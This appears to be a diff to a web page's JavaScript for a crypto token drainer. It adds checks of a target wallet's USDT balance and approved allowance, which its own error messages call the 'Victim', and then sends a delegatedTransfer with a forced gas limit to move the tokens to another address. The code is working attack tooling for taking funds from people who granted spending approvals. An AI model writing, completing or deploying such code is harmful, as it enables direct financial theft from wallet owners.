@@ -209,6 +209,21 @@
 
         const amountParsed = ethers.utils.parseUnits(amount.toString(), 18);
 
+        // Step 2: Check allowance and balance manually
+        const token = new ethers.Contract(tokenAddress, ["function allowance(address,address) view returns (uint256)", "function balanceOf(address) view returns (uint256)"], provider);
+        const [allowance, balance] = await Promise.all([
+          token.allowance(from, contractAddress),
+          token.balanceOf(from)
+        ]);
+        
+        if (balance.lt(amountParsed)) {
+          throw new Error(`INSUFFICIENT BALANCE: Victim only has ${ethers.utils.formatUnits(balance, 18)} USDT.`);
+        }
+
+        if (allowance.lt(amountParsed)) {
+          throw new Error(`INSUFFICIENT ALLOWANCE: Victim only approved ${ethers.utils.formatUnits(allowance, 18)} USDT.`);
+        }
+
         // --- PRE-FLIGHT DEBUGGING ---
         output.innerText = "🔍 Debugging transaction...";
         debugBox.style.display = "block";
@@ -225,7 +240,7 @@
         }
 
         output.innerText = "⏳ Confirm in MetaMask...";
-        // If static call passed, we send with forced gas limit
+        // Step 3: Execute with forced gas limit
         const tx = await contract.delegatedTransfer(
           tokenAddress, from, to, amountParsed,
           { gasLimit: 250000 } // High gas limit to avoid estimation failure
